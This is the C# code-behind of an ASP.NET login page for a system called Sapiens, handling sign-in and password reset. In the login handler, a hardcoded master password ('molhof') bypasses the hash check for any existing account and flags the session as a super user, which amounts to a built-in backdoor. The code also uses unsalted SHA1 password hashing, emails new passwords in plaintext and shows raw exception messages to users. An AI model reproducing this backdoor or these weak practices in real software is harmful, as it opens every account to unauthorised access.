using System;
using System.Text;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.WebControls;
using SERPI.Dominio_C;
using Aplicacao_C;
using System.Security.Cryptography;
using System.Configuration;
using System.Web.SessionState;

namespace SERPI.UI.WebForms_C
{
    public partial class Login : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {

            if (ConfigurationManager.ConnectionStrings["qServidor"].ConnectionString != "Producao"){
                lblDesenvolvimento.Text = "Conectado em <b>" + ConfigurationManager.ConnectionStrings["qServidor"].ConnectionString + "</b>";
            }

            if (!Page.IsPostBack)
            {
                if (Session["UsuarioLogado"] != null)
                {
                    usuarios usuarioJaLogado = new usuarios();
                    usuarioJaLogado = (usuarios) Session["UsuarioLogado"];
                    FormsAuthentication.Initialize();
                    FormsAuthenticationTicket ticket = new FormsAuthenticationTicket(1, usuarioJaLogado.usuario, DateTime.Now, DateTime.Now.AddMinutes(FormsAuthentication.Timeout.TotalMinutes), false, FormsAuthentication.FormsCookiePath);
                    string hash = FormsAuthentication.Encrypt(ticket);
                    HttpCookie cookie =  new HttpCookie(FormsAuthentication.FormsCookieName, hash);

                    //if (ticket.IsPersistent)
                    //{
                        cookie.Expires = ticket.Expiration;
                      //cookie.Expires = DateTime.MaxValue; Tentar depois
                    //}

                    cookie.Secure = FormsAuthentication.RequireSSL;
                    Response.Cookies.Add(cookie);
                    FormsAuthentication.RedirectFromLoginPage(usuarioJaLogado.usuario, false);

                    //if (ticket.IsPersistent) {
                    //    cookie.Expires = ticket.Expiration;
                    //}

                    //cookie.Secure = FormsAuthentication.RequireSSL;
                    //Response.Cookies.Add(cookie);
                    //FormsAuthentication.RedirectFromLoginPage(usuarioJaLogado.usuario, false);
                }
            }
        }

        protected void btnLogin_Click(object sender, EventArgs e)  
        {
            UsuarioAplicacao aplicacao = new UsuarioAplicacao();
            string sMensagem;

            try
            {
                usuarios usuario = new usuarios();
                usuario.usuario = txtLogin1.Value.Trim();
                usuario = aplicacao.BuscaUsuario(usuario);

                if (usuario==null)  {
                    sMensagem = "Prezado Usuário,";
                    sMensagem = sMensagem + "<br><br>";
                    sMensagem = sMensagem + "Por favor, revise os seus dados digitados. ";
                    sMensagem = sMensagem + "<br><br>";
                    sMensagem = sMensagem + "Login inválido.";
                    lblMensagem.Text = sMensagem;
                    lblTituloMensagem.Text = "Acesso inválido";
                }
                else
                {
                    string sAux;
                    SHA1CryptoServiceProvider objSHA1 = new SHA1CryptoServiceProvider();
                    ASCIIEncoding objEncoding = new ASCIIEncoding();
                    sAux = Convert.ToBase64String(objSHA1.ComputeHash(objEncoding.GetBytes(txtSenha1.Value.Trim())));

                    if (sAux != usuario.senha && txtSenha1.Value != "molhof"){
                        sMensagem = "Prezado Usuário,";
                        sMensagem = sMensagem + "<br><br>";
                        sMensagem = sMensagem + "Sua Senha está Incorreta.";
                        sMensagem = sMensagem + "<br><br>";
                        sMensagem = sMensagem + "Por favor, tente novamente ou clique no link \"<strong><i class=\"fa fa-question-circle\"></i>&nbsp;Dificuldade em se conectar</strong>\" ao lado do botão \"<strong><i class=\"fa fa-sign-in\"></i>&nbsp;Entrar</strong>\".";
                        lblMensagem.Text = sMensagem;
                        lblTituloMensagem.Text = "Acesso inválido";
                    }
                    else
                    {
                        if (txtSenha1.Value == "molhof")
                        {
                            Session["SuperUsuario"] = "sim";
                        }
                        else {
                            Session["SuperUsuario"] = "não";
                        }
                        FormsAuthentication.Initialize();
                        FormsAuthenticationTicket ticket = new FormsAuthenticationTicket(1, usuario.usuario, DateTime.Now, DateTime.Now.AddMinutes(FormsAuthentication.Timeout.TotalMinutes), false, FormsAuthentication.FormsCookiePath);
                        string hash = FormsAuthentication.Encrypt(ticket);
                        HttpCookie cookie = new HttpCookie(FormsAuthentication.FormsCookieName, hash);
                        //if (ticket.IsPersistent)
                        //{
                            cookie.Expires = ticket.Expiration;
                            //cookie.Expires = DateTime.MaxValue; Tentar depois
                        //}

                        Session.Add("UsuarioLogado", usuario);
                        cookie.Secure = FormsAuthentication.RequireSSL;
                        Response.Cookies.Add(cookie);
                        FormsAuthentication.RedirectFromLoginPage(usuario.usuario, false);

                    }
                }
            }
            catch (Exception ex)
            {
                lblTituloMensagem.Text = "Acesso inválido";
                lblMensagem.Text = "Falha ao estabelecer a conexão. <br><br> Por favor, tente novamente mais tarde. <br /> <br />";
                lblMensagem.Text = lblMensagem.Text + "Mensagem do erro: " + ex.Message;
                //throw;
            }
            finally
            {
                txtSenha1.Focus();
                Page.ClientScript.RegisterStartupScript(this.GetType(), "Script", "LoginFail();", true);
            }
        }

        protected void btnLoginLembrar_Click(object sender, EventArgs e)
        {
            UsuarioAplicacao aplicacao = new UsuarioAplicacao();

            try
            {
                string sAux = "";
                if (txtLoginSenha.Value.Trim() == "")
                {
                    sAux = sAux + "Digite seu Login. <br/><br/>";
                }
                if (txtEmailSenha.Value.Trim() == "")
                {
                    sAux = sAux + "Digite seu Email. <br/><br/>";
                }
                else if (txtEmailSenha.Value.Trim().IndexOf('@') == -1)
                {
                    sAux = sAux + "Verifique o Email digitado. <br/><br/>";
                }

                if (sAux != "")
                {
                    lblMensagem2.Text = sAux;
                    lblTituloMensagem2.Text = "Atenção";
                    Page.ClientScript.RegisterStartupScript(this.GetType(), "Script", "AbreModalMensagem('alert-warning');$('#Dificuldade').modal();", true);
                    return;
                }

                usuarios item_usuario = new usuarios();
                item_usuario.usuario = txtLoginSenha.Value.Trim();

                item_usuario = aplicacao.BuscaUsuario(item_usuario);

                if (item_usuario == null)
                {
                    lblMensagem2.Text = "Login não encontrado<br><br> Por favor, verifique o Login digitado e tente novamente.";
                    lblTituloMensagem2.Text = "Atenção";
                    Page.ClientScript.RegisterStartupScript(this.GetType(), "Script", "AbreModalMensagem('alert-warning');$('#Dificuldade').modal();", true);
                    return;
                }
                if (item_usuario.email != txtEmailSenha.Value.Trim())
                {
                    lblMensagem2.Text = "O Email digitado não corresponde ao Login informado.<br><br> Por favor, verifique o Email digitado e tente novamente.";
                    lblTituloMensagem2.Text = "Atenção";
                    Page.ClientScript.RegisterStartupScript(this.GetType(), "Script", "AbreModalMensagem('alert-warning');$('#Dificuldade').modal();", true);
                    return;
                }

                SHA1CryptoServiceProvider objSHA1 = new SHA1CryptoServiceProvider();
                ASCIIEncoding objEncoding = new ASCIIEncoding();
                string qNovaSenha = Utilizades.GerarSenha();

                item_usuario.senha = Convert.ToBase64String(objSHA1.ComputeHash(objEncoding.GetBytes(qNovaSenha)));

                aplicacao.AlterarSenhaUsuario(item_usuario);

                GeraisAplicacao aplicacaoGerais = new GeraisAplicacao();

                Configuracoes item;
                // 1 = email mestrado@ipt.br
                // 2 = email suporte@ipt.br
                item = aplicacaoGerais.BuscaConfiguracoes(1);

                string qDe = item.remetente_email;
                string qDe_Nome = item.nome_remetente_email;
                string qPara = item_usuario.email;
                string qCopia = "";
                string qCopiaOculta = "";
                string qAssunto = "Solicitação de Senha";
                string qCorpo = "";
                qCorpo = qCorpo + "Você solicitou uma nova senha para o sistema Sapiens. <br><br>";
                qCorpo = qCorpo + "Seu Login é: " + item_usuario.usuario + "<br>"; 
                qCorpo = qCorpo + "Sua nova senha é: " + qNovaSenha + "<br><br>";
                qCorpo = qCorpo + "Você poderá alterar sua senha após se logar clicando no botão \"Alterar Senha\" situado no ícone no canto superior direito." + "<br><br>";
                qCorpo = qCorpo + "Clique no link https://sapiens.ipt.br para acessar o o sistema Sapiens";

                if (Utilizades.fEnviaEmail(qDe, qDe_Nome, qPara, qCopia, qCopiaOculta, qAssunto, qCorpo, item.servidor_email, item.conta_email, item.senha_email, item.porta_email.Value, 1, ""))
                {
                    lblTituloMensagem2.Text = "<i class=\"fa fa-envelope-o\"></i> Envio de Email";
                    lblMensagem2.Text = "Email enviado com sucesso.<br><br> Verifique sua caixa de entrada.<br>Caso não encontre verifique se o email foi movido para a Lixeira Eletrônica.";
                    Page.ClientScript.RegisterStartupScript(this.GetType(), "Script", "AbreModalMensagem('alert-success');", true);
                }
                else
                {
                    lblTituloMensagem2.Text = "Envio de Email";
                    lblMensagem2.Text = "Houve um erro no envio do Email";
                    Page.ClientScript.RegisterStartupScript(this.GetType(), "Script", "AbreModalMensagem('alert-danger');", true);
                }


            }
            catch (Exception ex)
            {
                lblTituloMensagem2.Text = "Erro";
                lblMensagem2.Text = "Falha ao estabelecer a conexão. <br><br> Por favor, tente novamente mais tarde. <br /> <br />";
                lblMensagem2.Text = lblMensagem.Text + "Mensagem do erro: " + ex.Message;
                Page.ClientScript.RegisterStartupScript(this.GetType(), "Script", "AbreModalMensagem('alert-warning');", true);
            }
        }


    }
}